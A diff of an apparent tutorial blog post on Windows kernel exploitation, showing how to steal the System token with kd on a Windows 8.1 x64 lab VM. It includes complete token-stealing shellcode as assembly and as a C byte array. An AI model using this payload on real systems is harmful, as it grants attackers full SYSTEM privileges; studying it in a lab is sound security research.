@@ -9,21 +9,24 @@ header-img: img/win-kernel-debug/bg.png
 tags: windows kernel debugging exploit token shellcode
 ---
 
-{% highlight text %}
+Continuing on the path to Windows kernel exploitation...
 
-{% endhighlight %}
+Thanks to the previous post, we now have a working lab for easily (and
+in a reasonably fast manner) debug Windows kernel.
 
 Let's skip ahead for a minute and assume we control PC using some vulnerability
 in kernel land (next post), then we may want to jump back into a user allocated
 buffer to execute a control shellcode. So where do we go from now? How to
-transform this controlled PC in the kernelland into a privileged process in
-userland?
+transform this controlled PC in the kernel-land into a privileged process in
+user-land?
 
-The classic technique is to steal the `SYSTEM` token and copy it into the
+The classic technique is to steal the `System` process token and copy it into the
 structure of our targeted arbitrary (but unprivileged) process (say `cmd.exe`).
 
-_Note_: our target here will the Modern.IE Windows 8.1 we created in the
-[previous post](/2017/08/07/setting-up-a-windows-vm-lab-for-kernel-debugging).
+_Note_: our target here will the Modern.IE Windows 8.1 x64 we created in the
+[previous post](/2017/08/07/setting-up-a-windows-vm-lab-for-kernel-debugging),
+that we'll interact with using `kd` via Network debugging. Refer to previous
+post if you need to set it up.
 
 
 # Stealing SYSTEM token using `kd`
@@ -69,7 +72,7 @@ kd> dt nt!_EX_FAST_REF ffffe000baa6c040+348
 {% endhighlight %}
 
 If we nullify the last nibble of the address (i.e. AND with -0xf on x64, -7 on
-x86), we end up having the token's structure address:
+x86), we end up having the `System` token's address:
 
 {% highlight text %}
 kd> ? 0xffffc000`2f405598 & -f
@@ -88,9 +91,10 @@ kd> dt nt!_TOKEN ffffc000`2f405590
     [...]
 {% endhighlight %}
 
-_Note_: the extension
+_Note_: the WinDBG extension
 [`!token`](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-token) provides
-a more detailed output.
+a more detailed (and parsed) output. You might to refer to it instead whenever
+you are analyzing tokens.
 
 So basically, if we create a process (say `cmd.exe`), and overwrite its token
 with the `System` token value we found (0xffffc0002f405590), our process will be
@@ -120,7 +124,8 @@ And tada ...
 
 {%include image.html src="/img/win-kernel-debug/token-bump-via-windbg-2.png" %}
 
-Now we know how to bump any process as `System` using `kd`.
+Now we know how to transform any unprivileged process into a privileged one
+using `kd`.
 
 
 # Shellcoding our way to SYSTEM
@@ -128,17 +133,22 @@ Now we know how to bump any process as `System` using `kd`.
 So the basic idea now, to reproduce the same steps that we did in the last
 part, but from our shellcode. So we need:
 
- 1. A pointer to `System` `nt!_EPROCESS` structure, and save the token
- 1. Look for our "new" process (`cmd.exe` is a good target) EPROCESS structure
+ 1. A pointer to `System` `EPROCESS` structure, and save the token (located
+    at offset +0x348)
+ 1. Look up for the current process `EPROCESS` structure
  1. Overwrite its token with `System`'s
  1. Profit!
 
 
 ## Getting the current process structure address
 
-Pointers to process structures on Windows are stored in a linked list. If we
-have the address of one, we can "scroll" back and forward to discover the
-others. This is exactly the purpose of the routine `nt!PsGetCurrentProcess`, but
+Pointers to process structures on Windows are stored in a doubly linked list (see the
+member `ActiveProcessLinks` of `nt!_EPROCESS` in `kd`).
+If we have the address to one process, we can "scroll" back and forward to discover the
+others. But first, we need to get the address of at the least one process in the
+kernel.
+
+This is exactly the purpose of the routine `nt!PsGetCurrentProcess`, but
 since we can't call it directly (thank you ASLR), we can still check what is it
 doing under the hood:
 
@@ -153,7 +163,7 @@ kd> dps gs:188 l1
 002b:00000000`00000188  fffff801`fedbfa00 nt!KiInitialThread
 {% endhighlight %}
 
-`mov   rax,qword ptr gs:[188h]` returns to an `_ETHREAD` structure (more
+`mov rax, qword ptr gs:[188h]` returns a pointer to an `_ETHREAD` structure (more
 specifically the kernel thread (KTHREAD) `nt!KiInitialThread`). If we check the content of
 this structure at the offset 0xb8, we find the structure to the current process:
 
@@ -168,7 +178,7 @@ kd> dt nt!_EPROCESS poi(nt!KiInitialThread+b8)
 {% endhighlight %}
 
 So now we know where our current process resides in the kernel (just like `kd`
-gave us using `!process 0 0 cmd.exe`), and therefore the beginning of our
+gave us using `!process 0 0 cmd.exe` earlier), and therefore the first of our
 shellcode:
 
 {% highlight asm %}
@@ -195,7 +205,7 @@ assembly, whose pseudo-C code would be:
 
 {% highlight c %}
 ptrProcess = curProcess
-while ptrProcess->UniqueProcessId != 4 {
+while ptrProcess->UniqueProcessId != SystemProcess->UniqueProcessId (4) {
    ptrProcess = ptrProcess->Flink
 }
 {% endhighlight %}
@@ -209,8 +219,8 @@ mov rbx, rax
 __loop:
 mov rbx, [rbx + 0x2e8] ;; +0x2e8  ActiveProcessLinks[0].Flink
 sub rbx, 0x2e8 ;; nextProcess
-mov r9, [rbx + 0x2e0] ;; +0x2e0  UniqueProcessId
-cmp r9, 4 ;; compare to target PID
+mov rcx, [rbx + 0x2e0] ;; +0x2e0  UniqueProcessId
+cmp rcx, 4 ;; compare to target PID
 jnz __loop
 
 ;; here rbx hold a pointer to System structure
@@ -219,8 +229,8 @@ jnz __loop
 
 ## Overwrite the current process token field with `System`'s
 
-This is the final part of our shellcode, and the easiest since everything was
-done in the steps above:
+This is the third and final part of our shellcode, and the easiest since
+everything was done in the steps above:
 
 {% highlight asm %}
 ;; rax has the pointer to the current KPROCESS
@@ -247,31 +257,31 @@ bytecode version of our shellcode.
 #define LEN 80
 
 const char sc[LEN] = ""
-  "\x50"                                                      // push rax
-  "\x53"                                                      // push rbx
-  "\x51"                                                      // push rcx
-  "\x48\x65\xa1\x88\x01\x00\x00\x00\x00\x00\x00"              // mov rax, gs:0x188
-  "\x48\x8b\x80\xb8\x00\x00\x00"                              // mov rax, [rax+0xb8]
-  "\x48\x89\xc3"                                              // mov rbx, rax
-  "\x48\x8b\x9b\xe8\x02\x00\x00"                              // mov rbx, [rbx+0x2e8]
-  "\x48\x81\xeb\xe8\x02\x00\x00"                              // sub rbx, 0x2e8
-  "\x48\x8b\x8b\xe0\x02\x00\x00"                              // mov rcx, [rbx+0x2e0]
-  "\x48\x83\xf9\x04"                                          // cmp rcx, 4
-  "\x75\x15"                                                  // jnz 0x17
-  "\x48\x8b\x8b\x48\x03\x00\x00"                              // mov rcx, [rbx + 0x348]
-  "\x48\x89\x88\x48\x03\x00\x00"                              // mov [rax + 0x348], rcx
-  "\x59"                                                      // pop rcx
-  "\x5b"                                                      // pop rbx
-  "\x58"                                                      // pop rax
-  "\x58\x58\x58\x58\x58"                                      // pop rax; pop rax; pop rax; pop rax; pop rax; (required for proper stack return)
-  "\x48\x31\xc0"                                              // xor rax, rax  (i.e. NT_SUCCESS)
-  "\xc3"                                                      // ret
+  "\x50"                                             // push rax
+  "\x53"                                             // push rbx
+  "\x51"                                             // push rcx
+  "\x48\x65\xa1\x88\x01\x00\x00\x00\x00\x00\x00"     // mov rax, gs:0x188
+  "\x48\x8b\x80\xb8\x00\x00\x00"                     // mov rax, [rax+0xb8]
+  "\x48\x89\xc3"                                     // mov rbx, rax
+  "\x48\x8b\x9b\xe8\x02\x00\x00"                     // mov rbx, [rbx+0x2e8]
+  "\x48\x81\xeb\xe8\x02\x00\x00"                     // sub rbx, 0x2e8
+  "\x48\x8b\x8b\xe0\x02\x00\x00"                     // mov rcx, [rbx+0x2e0]
+  "\x48\x83\xf9\x04"                                 // cmp rcx, 4
+  "\x75\x15"                                         // jnz 0x17
+  "\x48\x8b\x8b\x48\x03\x00\x00"                     // mov rcx, [rbx + 0x348]
+  "\x48\x89\x88\x48\x03\x00\x00"                     // mov [rax + 0x348], rcx
+  "\x59"                                             // pop rcx
+  "\x5b"                                             // pop rbx
+  "\x58"                                             // pop rax
+  "\x58\x58\x58\x58\x58"                             // pop rax; pop rax; pop rax; pop rax; pop rax; (required for proper stack return)
+  "\x48\x31\xc0"                                     // xor rax, rax  (i.e. NT_SUCCESS)
+  "\xc3"                                             // ret
   "";
 {% endhighlight %}
 
 
 Once copied into an executable location, this shellcode will grant the current
-process with `NT SYSTEM` privilege.
+process with all `System` privileges.
 
 The next post will actually use this newly created shellcode in a concrete
 vulnerability exploitation (from the
